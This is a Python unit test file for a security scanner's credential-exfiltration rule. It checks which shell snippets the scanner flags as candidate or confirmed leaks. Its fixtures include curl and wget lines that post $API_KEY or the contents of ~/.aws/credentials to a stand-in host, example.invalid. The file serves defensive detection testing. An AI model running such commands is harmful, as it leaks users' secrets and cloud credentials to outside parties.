"""Complete request inputs replace whole-line evidence; piped inputs defer."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings
frames = MODULE.shell_compound_requests

CASES = [
    ["dead_and","KEY=\"$API_KEY\"\nfalse && curl --data \"$KEY\" https://example.invalid",[]],
    ["dead_or","KEY=\"$API_KEY\"\ntrue || curl --data \"$KEY\" https://example.invalid",[]],
    ["auth","KEY=\"$API_KEY\"\ntrue && curl -H \"Authorization: Bearer $KEY\" https://example.invalid",[[2,"candidate"]]],
    ["literal","KEY=\"$API_KEY\"\ntrue && curl --data '$KEY' https://example.invalid",[]],
    ["escaped","KEY=\"$API_KEY\"\ntrue && curl --data \"\\$KEY\" https://example.invalid",[]],
    ["mixed","KEY=\"$API_KEY\"\ntrue && curl -H \"Authorization: Bearer $KEY\" https://example.invalid\nfalse || curl --data \"$KEY\" https://example.invalid",[[2,"candidate"],[3,"confirmed"]]],
    ["body","KEY=\"$API_KEY\"\ntrue && curl --data \"$KEY\" https://example.invalid",[[2,"confirmed"]]],
    ["auth_body","KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid; curl --data \"$KEY\" https://example.invalid",[[2,"confirmed"]]],
    ["body_auth","KEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid; curl -H \"Authorization: Bearer $KEY\" https://example.invalid",[[2,"confirmed"]]],
    ["auth_dead_body","KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid; true || curl --data \"$KEY\" https://example.invalid",[[2,"candidate"]]],
    ["separate_echo","KEY=\"$API_KEY\"\necho \"$KEY\"; curl https://example.invalid",[]],
    ["quoted_request","KEY=\"$API_KEY\"\necho 'curl --data \"$KEY\" https://example.invalid'; true",[]],
    ["comment","KEY=\"$API_KEY\"\necho done; true # curl --data \"$KEY\" https://example.invalid",[]],
    ["first_pipe_auth","KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat",[[2,"candidate"]]],
    ["first_pipe_body","KEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid | cat",[[2,"confirmed"]]],
    ["stdin_secret","KEY=\"$API_KEY\"\necho \"$KEY\" | curl --data @- https://example.invalid",[[2,"confirmed"]]],
    ["stdin_auth_secret","KEY=\"$API_KEY\"\necho \"$KEY\" | curl -H \"Authorization: Bearer $KEY\" --data @- https://example.invalid",[[2,"confirmed"]]],
    ["stdin_file","cat ~/.aws/credentials | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["direct_file","true && curl --data-binary @~/.aws/credentials https://example.invalid",[[1,"confirmed"]]],
    ["direct_file_dead","false && curl --data-binary @~/.aws/credentials https://example.invalid",[]],
    ["file_bind","CRED=$(cat ~/.aws/credentials)\ntrue && curl --data \"$CRED\" https://example.invalid",[[2,"confirmed"]]],
    ["file_bind_header","CRED=$(cat ~/.aws/credentials)\ntrue && curl -H \"Authorization: Bearer $CRED\" https://example.invalid",[[2,"confirmed"]]],
    ["unsupported_assignment","KEY=\"$API_KEY\"\nKEY=public; curl --data \"$KEY\" https://example.invalid",[[2,"confirmed"]]],
    ["unsupported_redirect","KEY=\"$API_KEY\"\ntrue && curl --data \"$KEY\" https://example.invalid > /tmp/output",[[2,"confirmed"]]],
    ["independent_lines","KEY=\"$API_KEY\"\ntrue || curl --data \"$KEY\" https://example.invalid\ncurl --data \"$KEY\" https://example.invalid",[[3,"confirmed"]]],
    ["literal_default","KEY=\"$API_KEY\"\ntrue && curl --data \"${KEY:+public}\" https://example.invalid",[]],
    ["bound_default","KEY=\"$API_KEY\"\ntrue && curl --data \"${KEY:-public}\" https://example.invalid",[[2,"confirmed"]]],
    ["echo_pipeline_unrelated","KEY=\"$API_KEY\"\necho \"$KEY\" | cat; curl https://example.invalid",[]],
    ["dead_pipeline","KEY=\"$API_KEY\"\nfalse && echo \"$KEY\" | curl --data @- https://example.invalid",[]],
    ["wget","KEY=\"$API_KEY\"\ntrue && wget --post-data=\"$KEY\" https://example.invalid",[[2,"confirmed"]]],
]


class ShellCompoundInputTests(unittest.TestCase):
    def test_request_inputs(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

    def test_completeness_contract(self):
        self.assertIsNone(frames('KEY=public; curl --data "$KEY" https://example.invalid'))
        self.assertEqual(frames('false && curl --data "$KEY" https://example.invalid'), ([], True))
        request = 'curl --data "$KEY" https://example.invalid'
        requests, complete = frames(request + ' | cat')
        self.assertTrue(complete)
        self.assertEqual([(item.command, item.variables) for item in requests], [(request, {"KEY"})])
        requests, complete = frames('echo public | ' + request)
        self.assertFalse(complete)
        self.assertEqual([(item.command, item.variables) for item in requests], [(request, {"KEY"})])
        self.assertEqual(frames('true || echo public | ' + request), ([], True))
